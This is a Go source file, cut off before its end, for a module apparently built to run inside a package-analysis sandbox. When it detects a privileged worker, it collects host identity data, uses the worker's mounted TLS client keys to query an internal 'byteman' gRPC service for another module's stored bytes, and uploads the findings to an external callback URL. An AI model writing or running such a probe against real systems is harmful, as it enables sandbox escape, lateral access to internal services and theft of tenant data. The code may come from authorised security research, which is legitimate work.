package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var genericResultURL string
var compilerResultURL string
var callbackSessionNonce string
var probeUserAgent string
var pinnedReadbackURL string
var pinnedReadbackOrigin string
var pinnedReadbackSession string
var pinnedReadbackURLSHA256 string
var rpcDialAddress string

const (
	protocolVersion         = 1
	moduleName              = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion            = "v0.0.53-codex"
	expectedUserAgent       = "go-cgo-pkgsite-probe-v053-codex"
	targetRegistry          = "https://proxy.golang.org"
	targetModuleName        = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion           = "v0.0.1"
	targetCanarySHA256      = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
	targetCanaryBytes       = 2512
	descriptorReceiptSHA256 = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
	expectedRecordSHA256    = "adfb1c1ce1b1b12a6c7fb47bc71a599080dec7357763e3af5d937849c7961e47"
	expectedDigestSHA256    = "6bc319fc0d36191274cec1b7269adfd81385b88169cdf83a783dc882097a6b94"
	expectedRecordIDSHA256  = "98a540dcf85bd84794699b0522f3e5d8f5de0697b1b0c51eef1c39058ba58ce3"
	emptyValueSHA256        = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	callbackTimeout         = 30 * time.Second
	streamGRPCTimeout       = 120 * time.Second
	streamHTTPTimeout       = 125 * time.Second
	maximumResultBytes      = 256 * 1024
	maximumResponseFrame    = 128 * 1024
	maximumResponseFrames   = 64
	bytemanServiceHost      = "byteman.default.svc.cluster.local"
	bytemanServicePort      = 9000
	bytemanTLSServerName    = "localhost"
	clientCertificatePath   = "/etc/tls/client/tls.crt"
	clientKeyPath           = "/etc/tls/client/tls.key"
	serverPoolPath          = "/etc/tls/server-pool/server-tls-pool.pem"
)

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}

type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

type identityResult struct {
	Lane        string      `json:"lane"`
	CWD         string      `json:"cwd"`
	UID         int         `json:"uid"`
	GID         int         `json:"gid"`
	Hostname    string      `json:"hostname"`
	PID1        string      `json:"pid1"`
	ModuleFiles []fileEntry `json:"module_files"`
	TLSFiles    []tlsFile   `json:"tls_files"`
}

type wireFieldDigest struct {
	Path     string  `json:"path"`
	WireType int     `json:"wire_type"`
	Varint   *uint64 `json:"varint,omitempty"`
	Bytes    int     `json:"bytes,omitempty"`
	SHA256   string  `json:"sha256,omitempty"`
	Text     string  `json:"text,omitempty"`
}

type streamFrameResult struct {
	Index         int    `json:"index"`
	PayloadBytes  int    `json:"payload_bytes"`
	PayloadSHA256 string `json:"payload_sha256"`
	FrameSHA256   string `json:"frame_sha256"`
	HeaderFields  int    `json:"header_fields"`
	DataFields    int    `json:"data_fields"`
	DataBytes     int    `json:"data_bytes"`
}

type streamHeaderResult struct {
	Present            bool                    `json:"present"`
	RawBytes           int                     `json:"raw_bytes,omitempty"`
	RawSHA256          string                  `json:"raw_sha256,omitempty"`
	ContentType        string                  `json:"content_type,omitempty"`
	StatusSet          bool                    `json:"status_set"`
	StatusCode         uint64                  `json:"status_code,omitempty"`
	EntityTagSHA256    string                  `json:"entity_tag_sha256,omitempty"`
	CacheControlSHA256 string                  `json:"cache_control_sha256,omitempty"`
	LastModified       uint64                  `json:"last_modified,omitempty"`
	Visited            uint64                  `json:"visited,omitempty"`
	Expires            uint64                  `json:"expires,omitempty"`
	FreshUntil         uint64                  `json:"fresh_until,omitempty"`
	RawHeaders         []streamRawHeaderResult `json:"raw_headers,omitempty"`
}

type streamRawHeaderResult struct {
	Name        string `json:"name"`
	ValueBytes  int    `json:"value_bytes"`
	ValueSHA256 string `json:"value_sha256"`
}

type grpcMetadataValue struct {
	Present   bool   `json:"present"`
	Values    int    `json:"values,omitempty"`
	RawBytes  int    `json:"raw_bytes,omitempty"`
	RawSHA256 string `json:"raw_sha256,omitempty"`
	Text      string `json:"text,omitempty"`
}

type streamVariant struct {
	ID                      string
	IncludeMetadata         bool
	SOSSessionHeaderPresent bool
}

type streamResult struct {
	VariantID                 string              `json:"variant_id"`
	Method                    string              `json:"method"`
	IncludeMetadata           bool                `json:"include_metadata"`
	HTTPStatus                int                 `json:"http_status,omitempty"`
	ContentType               string              `json:"content_type,omitempty"`
	GRPCStatusHeader          grpcMetadataValue   `json:"grpc_status_header"`
	GRPCMessageHeader         grpcMetadataValue   `json:"grpc_message_header"`
	GRPCStatusTrailer         grpcMetadataValue   `json:"grpc_status_trailer"`
	GRPCMessageTrailer        grpcMetadataValue   `json:"grpc_message_trailer"`
	TrailersObserved          bool                `json:"trailers_observed"`
	TrailersComplete          bool                `json:"trailers_complete"`
	EOFObserved               bool                `json:"eof_observed"`
	RequestPayloadBytes       int                 `json:"request_payload_bytes"`
	RequestPayloadSHA256      string              `json:"request_payload_sha256"`
	RequestFrameBytes         int                 `json:"request_frame_bytes"`
	RequestFrameSHA256        string              `json:"request_frame_sha256"`
	RequestWire               []wireFieldDigest   `json:"request_wire"`
	SOSSessionHeaderPresent   bool                `json:"sos_session_header_present"`
	SOSSessionHeaderBytes     int                 `json:"sos_session_header_bytes"`
	SOSSessionHeaderSHA256    string              `json:"sos_session_header_sha256"`
	Frames                    []streamFrameResult `json:"frames,omitempty"`
	Header                    streamHeaderResult  `json:"header"`
	PayloadBytes              int                 `json:"payload_bytes,omitempty"`
	PayloadSHA256             string              `json:"payload_sha256,omitempty"`
	StoppedBeforeEOF          bool                `json:"stopped_before_eof"`
	Verified                  bool                `json:"verified"`
	ResponseRecordIdentitySet bool                `json:"response_record_identity_present"`
	StartedUTC                string              `json:"started_utc"`
	FinishedUTC               string              `json:"finished_utc"`
	DurationMS                int64               `json:"duration_ms"`
	Error                     string              `json:"error,omitempty"`
}

type probeReport struct {
	Schema                  string         `json:"schema"`
	Module                  string         `json:"module"`
	Version                 string         `json:"version"`
	TargetModule            string         `json:"target_module"`
	TargetVersion           string         `json:"target_version"`
	TargetURLSHA256         string         `json:"target_url_sha256"`
	TargetBodySHA256        string         `json:"target_body_sha256"`
	DescriptorReceiptSHA256 string         `json:"descriptor_receipt_sha256"`
	ExpectedRecordSHA256    string         `json:"expected_record_sha256"`
	ExpectedDigestSHA256    string         `json:"expected_digest_field_sha256"`
	ExpectedRecordIDSHA256  string         `json:"expected_id_field_sha256"`
	StartedUTC              string         `json:"started_utc"`
	FinishedUTC             string         `json:"finished_utc"`
	Identity                identityResult `json:"identity"`
	Streams                 []streamResult `json:"streams,omitempty"`
	SuccessfulVariant       string         `json:"successful_variant,omitempty"`
	StoppedAfterSuccess     bool           `json:"stopped_after_success"`
	Reason                  string         `json:"reason"`
}

var fixedStreamVariants = []streamVariant{
	{ID: "url-metadata-empty-session", IncludeMetadata: true, SOSSessionHeaderPresent: true},
	{ID: "url-only-empty-session", IncludeMetadata: false, SOSSessionHeaderPresent: true},
	{ID: "url-metadata-session-omitted", IncludeMetadata: true, SOSSessionHeaderPresent: false},
	{ID: "url-only-session-omitted", IncludeMetadata: false, SOSSessionHeaderPresent: false},
}

func main() {
	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 ||
		os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	report := newProbeReport(started, identity)
	endpoint := genericResultURL
	resultID := "v053-codex-" + identity.Lane
	if identity.Lane == "capslock" {
		endpoint = compilerResultURL
		resultID = "v053-codex-capslock-stream-diagnostic"
		report.Streams, report.SuccessfulVariant = runPinnedStreamDiagnostics()
		report.StoppedAfterSuccess = report.SuccessfulVariant != ""
		if report.StoppedAfterSuccess {
			report.Reason = "a fixed incremental Stream variant returned the exact previously written owned-B bytes"
		} else {
			report.Reason = "all four fixed read-only Stream variants completed without exact owned-B verification"
		}
	} else {
		report.Reason = "Stream is fixed to the verified Capslock lane"
	}
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{
		Schema:                  "owned-byteman-stream-diagnostic/v1",
		Module:                  moduleName,
		Version:                 probeVersion,
		TargetModule:            targetModuleName,
		TargetVersion:           targetVersion,
		TargetURLSHA256:         pinnedReadbackURLSHA256,
		TargetBodySHA256:        targetCanarySHA256,
		DescriptorReceiptSHA256: descriptorReceiptSHA256,
		ExpectedRecordSHA256:    expectedRecordSHA256,
		ExpectedDigestSHA256:    expectedDigestSHA256,
		ExpectedRecordIDSHA256:  expectedRecordIDSHA256,
		StartedUTC:              started.UTC().Format(time.RFC3339Nano),
		Identity:                identity,
	}
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func parseExactHTTPS(raw, expectedPath string) (*url.URL, error) {
	parsed, err := url.Parse(raw)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
		return nil, errors.New("URL was outside its exact fixed HTTPS shape")
	}
	if port := parsed.Port(); port != "" {
		value, parseErr := strconv.Atoi(port)
		if parseErr != nil || value < 1 || value > 65535 {
			return nil, errors.New("URL port was invalid")
		}
	}
	return parsed, nil
}

func validateRuntimeConfiguration() error {
	if !validNonce(callbackSessionNonce) || !validNonce(pinnedReadbackSession) ||
		callbackSessionNonce == pinnedReadbackSession || probeUserAgent != expectedUserAgent {
		return errors.New("runtime identities were invalid or not isolated")
	}
	generic, err := parseExactHTTPS(genericResultURL, "/v1/result/"+callbackSessionNonce+"/generic")
	if err != nil {
		return err
	}
	compiler, err := parseExactHTTPS(compilerResultURL, "/v1/result/"+callbackSessionNonce+"/compiler")
	if err != nil || generic.Scheme != compiler.Scheme || generic.Host != compiler.Host {
		return errors.New("callback endpoints did not share one exact origin")
	}
	readbackPath := "/v1/goproxy/" + pinnedReadbackSession + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
	readback, err := parseExactHTTPS(pinnedReadbackURL, readbackPath)
	if err != nil || pinnedReadbackOrigin != readback.Scheme+"://"+readback.Host ||
		pinnedReadbackOrigin == generic.Scheme+"://"+generic.Host {
		return errors.New("pinned readback URL was not isolated from the callback origin")
	}
	digest := sha256.Sum256([]byte(pinnedReadbackURL))
	if hex.EncodeToString(digest[:]) != pinnedReadbackURLSHA256 {
		return errors.New("pinned readback URL digest mismatch")
	}
	return nil
}

func runPinnedStreamDiagnostics() ([]streamResult, string) {
	return runFixedStreamVariants(runPinnedStreamVariant)
}

func runFixedStreamVariants(run func(streamVariant) streamResult) ([]streamResult, string) {
	results := make([]streamResult, 0, len(fixedStreamVariants))
	for _, variant := range fixedStreamVariants {
		result := run(variant)
		results = append(results, result)
		if result.Verified {
			return results, variant.ID
		}
	}
	return results, ""
}

func runPinnedStreamVariant(variant streamVariant) (result streamResult) {
	started := time.Now()
	requestPayload := buildTargetStreamRequest(variant.IncludeMetadata)
	result = newStreamResult(requestPayload, variant, started)
	defer func() {
		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		result.DurationMS = time.Since(started).Milliseconds()
	}()
	client, endpoint, err := newBytemanClient()
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer client.CloseIdleConnections()
	ctx, cancel := context.WithTimeout(context.Background(), streamHTTPTimeout)
	defer cancel()
	frame := grpcFrame(requestPayload)
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+result.Method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	applyStreamHeaders(request, variant.SOSSessionHeaderPresent)
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	captureGRPCMetadata(response.Header, &result.GRPCStatusHeader, &result.GRPCMessageHeader)
	if response.StatusCode != http.StatusOK || !strings.HasPrefix(result.ContentType, "application/grpc") {
		result.Error = "Stream response did not have HTTP 200 application/grpc"
		return result
	}
	payload := make([]byte, 0, targetCanaryBytes)
	for index := 0; index < maximumResponseFrames; index++ {
		header := make([]byte, 5)
		if _, err := io.ReadFull(response.Body, header); err != nil {
			result.EOFObserved = errors.Is(err, io.EOF)
			result.TrailersComplete = result.EOFObserved || errors.Is(err, io.ErrUnexpectedEOF)
			captureGRPCTrailers(response, &result)
			result.Error = cleanError(fmt.Errorf("incremental gRPC frame header: %w", err))
			return result
		}
		if header[0] != 0 {
			result.Error = "compressed Stream frame was rejected"
			return result
		}
		length := int(binary.BigEndian.Uint32(header[1:]))
		if length < 0 || length > maximumResponseFrame {
			result.Error = "Stream frame exceeded the bounded size"
			return result
		}
		body := make([]byte, length)
		if _, err := io.ReadFull(response.Body, body); err != nil {
			result.TrailersComplete = errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF)
			captureGRPCTrailers(response, &result)
			result.Error = cleanError(fmt.Errorf("incremental gRPC frame payload: %w", err))
			return result
		}
		frameBytes := append(append([]byte(nil), header...), body...)
		bodyDigest := sha256.Sum256(body)
		frameDigest := sha256.Sum256(frameBytes)
		frameResult := streamFrameResult{
			Index: index, PayloadBytes: len(body), PayloadSHA256: hex.EncodeToString(bodyDigest[:]),
			FrameSHA256: hex.EncodeToString(frameDigest[:]),
		}
		if err := consumeStreamFrame(body, &payload, &result.Header, &frameResult); err != nil {
			result.Frames = append(result.Frames, frameResult)
			result.Error = cleanError(err)
			return result
		}
		result.Frames = append(result.Frames, frameResult)
		if len(payload) == targetCanaryBytes {
			payloadSHA256, err := verifyCompletedStream(payload, result.Header)
			result.PayloadBytes = len(payload)
			result.PayloadSHA256 = payloadSHA256
			if err != nil {
				result.Error = cleanError(err)
				return result
			}
			result.StoppedBeforeEOF = true
			result.Verified = true
			_ = response.Body.Close()
			captureGRPCTrailers(response, &result)
			return result
		}
	}
	result.Error = "Stream exceeded the bounded frame count before exact verification"
	return result
}

func verifyCompletedStream(payload []byte, header streamHeaderResult) (string, error) {
	digest := sha256.Sum256(payload)
	payloadSHA256 := hex.EncodeToString(digest[:])
	if len(payload) != targetCanaryBytes || payloadSHA256 != targetCanarySHA256 {
		return payloadSHA256, errors.New("Stream reached the exact size with the wrong payload digest")
	}
	if !header.Present || !header.StatusSet || header.StatusCode != http.StatusOK {
		return payloadSHA256, errors.New("Stream did not include exactly one header with status_code 200")
	}
	return payloadSHA256, nil
}

func applyStreamHeaders(request *http.Request, sessionHeaderPresent bool) {
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Grpc-Timeout", "120S")
	if sessionHeaderPresent {
		request.Header[http.CanonicalHeaderKey("X-SOS-SessionID")] = []string{""}
	}
}

func captureGRPCMetadata(header http.Header, status, message *grpcMetadataValue) {
	*status = captureGRPCMetadataValue(header, "Grpc-Status", false)
	*message = captureGRPCMetadataValue(header, "Grpc-Message", true)
}

func captureGRPCTrailers(response *http.Response, result *streamResult) {
	if len(response.Trailer) == 0 {
		return
	}
	result.TrailersObserved = true
	captureGRPCMetadata(response.Trailer, &result.GRPCStatusTrailer, &result.GRPCMessageTrailer)
}

func captureGRPCMetadataValue(header http.Header, name string, decodeMessage bool) grpcMetadataValue {
	values := []string(nil)
	for key, candidates := range header {
		if strings.EqualFold(key, name) {
			values = append(values, candidates...)
		}
	}
	if values == nil {
		return grpcMetadataValue{}
	}
	raw := strings.Join(values, "\x00")
	digest := sha256.Sum256([]byte(raw))
	text := raw
	if decodeMessage {
		if decoded, err := url.PathUnescape(raw); err == nil {
			text = decoded
		}
		text = cleanSensitiveText(text)
	} else if len(text) > 64 {
		text = text[:64] + "[truncated]"
	}
	return grpcMetadataValue{
		Present: true, Values: len(values), RawBytes: len(raw),
		RawSHA256: hex.EncodeToString(digest[:]), Text: text,
	}
}

func newStreamResult(payload []byte, variant streamVariant, started time.Time) streamResult {
	payloadDigest := sha256.Sum256(payload)
	frame := grpcFrame(payload)
	frameDigest := sha256.Sum256(frame)
	result := streamResult{
		VariantID:                 variant.ID,
		Method:                    "/sos.byteman.Byteman/Stream",
		IncludeMetadata:           variant.IncludeMetadata,
		RequestPayloadBytes:       len(payload),
		RequestPayloadSHA256:      hex.EncodeToString(payloadDigest[:]),
		RequestFrameBytes:         len(frame),
		RequestFrameSHA256:        hex.EncodeToString(frameDigest[:]),
		RequestWire:               summarizeStreamRequest(payload),
		SOSSessionHeaderPresent:   variant.SOSSessionHeaderPresent,
		SOSSessionHeaderBytes:     0,
		ResponseRecordIdentitySet: false,
		StartedUTC:                started.UTC().Format(time.RFC3339Nano),
	}
	if variant.SOSSessionHeaderPresent {
		result.SOSSessionHeaderSHA256 = emptyValueSHA256
	}
	return result
}

func consumeStreamFrame(message []byte, payload *[]byte, headerResult *streamHeaderResult, frameResult *streamFrameResult) error {
	fields, err := decodeWireFields(message)
	if err != nil {
		return err
	}
	for _, field := range fields {
		switch field.number {
		case 1:
			if field.wire != 2 || headerResult.Present {
				return errors.New("StreamResponse header field was duplicated or had the wrong wire type")
			}
			parsed, err := parseStreamHeader(field.value)
			if err != nil {
				return err
			}
			*headerResult = parsed
			frameResult.HeaderFields++
		case 2:
			if field.wire != 2 {
				return errors.New("StreamResponse data field had the wrong wire type")
			}
			frameResult.DataFields++
			frameResult.DataBytes += len(field.value)
			if len(*payload)+len(field.value) > targetCanaryBytes {
				return errors.New("StreamResponse data exceeded the exact owned-B size")
			}
			*payload = append(*payload, field.value...)
		default:
			return errors.New("StreamResponse contained a field outside header 1 and data 2")
		}
	}
	return nil
}

func parseStreamHeader(raw []byte) (streamHeaderResult, error) {
	result := streamHeaderResult{Present: true, RawBytes: len(raw)}
	digest := sha256.Sum256(raw)
	result.RawSHA256 = hex.EncodeToString(digest[:])
	fields, err := decodeWireFields(raw)
	if err != nil {
		return result, err
	}
	counts := map[int]int{}
	for _, field := range fields {
		counts[field.number]++
		switch field.number {
		case 1:
			if field.wire != 2 || counts[1] != 1 || !utf8.Valid(field.value) || len(field.value) > 256 {
				return result, errors.New("Stream header content_type was invalid")
			}
			result.ContentType = string(field.value)
		case 2:
			if field.wire != 0 || counts[2] != 1 {
				return result, errors.New("Stream header status_code was invalid")
			}
			result.StatusSet = true
			result.StatusCode = field.varint
		case 3:
			if field.wire != 2 || counts[3] != 1 || !utf8.Valid(field.value) || len(field.value) > 4096 {
				return result, errors.New("Stream header entity_tag was invalid")
			}
			valueDigest := sha256.Sum256(field.value)
			result.EntityTagSHA256 = hex.EncodeToString(valueDigest[:])
		case 4:
			if field.wire != 2 || counts[4] != 1 || !utf8.Valid(field.value) || len(field.value) > 4096 {
				return result, errors.New("Stream header cache_control was invalid")
			}
			valueDigest := sha256.Sum256(field.value)
			result.CacheControlSHA256 = hex.EncodeToString(valueDigest[:])
		case 5, 6, 7, 8:
			if field.wire != 0 || counts[field.number] != 1 {
				return result, errors.New("Stream header time field was invalid")
			}
			switch field.number {
			case 5:
				result.LastModified = field.varint
			case 6:
				result.Visited = field.varint
			case 7:
				result.Expires = field.varint
			case 8:
				result.FreshUntil = field.varint
			}
		case 9:
			if field.wire != 2 || len(result.RawHeaders) >= 64 {
				return result, errors.New("Stream header raw field was invalid")
			}
			rawHeader, err := parseStreamRawHeader(field.value)
			if err != nil {
				return result, err
			}
			result.RawHeaders = append(result.RawHeaders, rawHeader)
		default:
			return result, errors.New("Stream header contained an unknown field")
		}
	}
	return result, nil
}

func parseStreamRawHeader(raw []byte) (streamRawHeaderResult, error) {
	result := streamRawHeaderResult{}
	fields, err := decodeWireFields(raw)
	if err != nil {
		return result, err
	}
	counts := map[int]int{}
	for _, field := range fields {
		counts[field.number]++
		switch field.number {
		case 1:
			if field.wire != 2 || counts[1] != 1 || len(field.value) == 0 || len(field.value) > 256 || !utf8.Valid(field.value) {
				return result, errors.New("Stream raw header name was invalid")
			}
			result.Name = string(field.value)
		case 2:
			if field.wire != 2 || counts[2] != 1 || len(field.value) > 64*1024 {
				return result, errors.New("Stream raw header value was invalid")
			}
			digest := sha256.Sum256(field.value)
			result.ValueBytes = len(field.value)
			result.ValueSHA256 = hex.EncodeToString(digest[:])
		default:
			return result, errors.New("Stream raw header contained an unknown field")
		}
	}
	if counts[1] != 1 || counts[2] != 1 {
		return result, errors.New("Stream raw header omitted name or value")
	}
	return result, nil
}

type wireField struct {
	number int
	wire   int
	varint uint64
	value  []byte
}

func decodeWireFields(data []byte) ([]wireField, error) {
	fields := []wireField{}
	for offset := 0; offset < len(data); {
		key, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return nil, errors.New("protobuf field key was invalid")
		}
		offset += size
		field := wireField{number: int(key >> 3), wire: int(key & 7)}
		if field.number < 1 || field.number > (1<<29)-1 {
			return nil, errors.New("protobuf field number was invalid")
		}
		switch field.wire {
		case 0:
			field.varint, size = binary.Uvarint(data[offset:])
			if size <= 0 {
				return nil, errors.New("protobuf varint was invalid")
			}
			offset += size
		case 2:
			length, lengthSize := binary.Uvarint(data[offset:])
			if lengthSize <= 0 {
				return nil, errors.New("protobuf length was invalid")
			}
			offset += lengthSize
			if length > uint64(len(data)-offset) {
				return nil, errors.New("protobuf field was truncated")
			}
			field.value = data[offset : offset+int(length)]
			offset += int(length)
		default:
			return nil, errors.New("protobuf wire type was outside the pinned schema")
		}
		fields = append(fields, field)
	}
	return fields, nil
}

func buildTargetMetadata() []byte {
	metadata := []byte{}
	metadata = appendStringField(metadata, 2, targetRegistry)
	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
	metadata = appendStringField(metadata, 4, targetModuleName)
	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
	metadata = appendStringField(metadata, 6, targetVersion)
	return metadata
}

func buildTargetStreamRequest(includeMetadata bool) []byte {
	request := appendStringField(nil, 1, pinnedReadbackURL)
	if includeMetadata {
		request = appendBytesField(request, 2, buildTargetMetadata())
	}
	return request
}

func summarizeStreamRequest(payload []byte) []wireFieldDigest {
	fields, err := decodeWireFields(payload)
	if err != nil {
		return nil
	}
	result := []wireFieldDigest{}
	for index, field := range fields {
		item := wireFieldDigest{Path: "request." + strconv.Itoa(field.number) + "[" + strconv.Itoa(index) + "]", WireType: field.wire}
		if field.wire == 0 {
			value := field.varint
			item.Varint = &value
		} else {
			digest := sha256.Sum256(field.value)
			item.Bytes = len(field.value)
			item.SHA256 = hex.EncodeToString(digest[:])
			if field.number == 1 {
				item.Text = "[pinned-readback-url]"
			}
		}
		result = append(result, item)
	}
	return result
}

func grpcFrame(payload []byte) []byte {
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	return append(frame, payload...)
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func mountedPrivateRootPool(rootPEM []byte) (*x509.CertPool, error) {
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, errors.New("mounted Byteman root pool contained no certificates")
	}
	return roots, nil
}

func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != bytemanTLSServerName {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	_, err := leaf.Verify(x509.VerifyOptions{
		Roots: roots, Intermediates: intermediates,
		KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	})
	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}

func newBytemanClient() (*http.Client, string, error) {
	certificate, err := tls.LoadX509KeyPair(clientCertificatePath, clientKeyPath)
	if err != nil {
		return nil, "", err
	}
	rootPEM, err := os.ReadFile(serverPoolPath)
	if err != nil {
		return nil, "", err
	}
	roots, err := mountedPrivateRootPool(rootPEM)
	if err != nil {
		return nil, "", err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, bytemanServiceHost)
	if err != nil {
		return nil, "", errors.New("direct Byteman service did not resolve")
	}
	var selected net.IP
	for _, candidate := range addresses {
		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
			selected = candidate.IP
			break
		}
	}
	if selected == nil {
		return nil, "", errors.New("direct Byteman service had no private address")
	}
	rpcDialAddress = net.JoinHostPort(selected.String(), strconv.Itoa(bytemanServicePort))
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certificate},
		RootCAs:            roots,
		MinVersion:         tls.VersionTLS12,
		ServerName:         bytemanTLSServerName,
		InsecureSkipVerify: true, // Legacy CN-only certificate is verified below.
		VerifyConnection: func(state tls.ConnectionState) error {
			return verifyLegacyLocalhost(state, roots)
		},
	}
	dialer := &net.Dialer{Timeout: callbackTimeout, KeepAlive: 30 * time.Second}
	transport := &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, rpcDialAddress)
		},
		TLSClientConfig: tlsConfig, ForceAttemptHTTP2: true,
	}
	endpoint := "https://" + net.JoinHostPort(bytemanServiceHost, strconv.Itoa(bytemanServicePort))
	return &http.Client{Transport: transport, Timeout: streamHTTPTimeout}, endpoint, nil
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version: protocolVersion, Session: callbackSessionNonce, ID: id, CWD: cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func submitResult(endpoint string, result commandResult) error {
	body, err := json.Marshal(result)
	if err != nil || len(body) > maximumResultBytes {
		return errors.New("result envelope was invalid")
	}
	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(body))
	if err != nil {
		return err
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       callbackTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode != http.StatusCreated {
		return fmt.Errorf("result endpoint HTTP %d", response.StatusCode)
	}
	return nil
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) &&
		strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
		lane = "capslock"
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{
		Lane: lane, CWD: cwd, UID: os.Geteuid(), GID: os.Getegid(), Hostname: hostname,
		PID1: strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
	}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
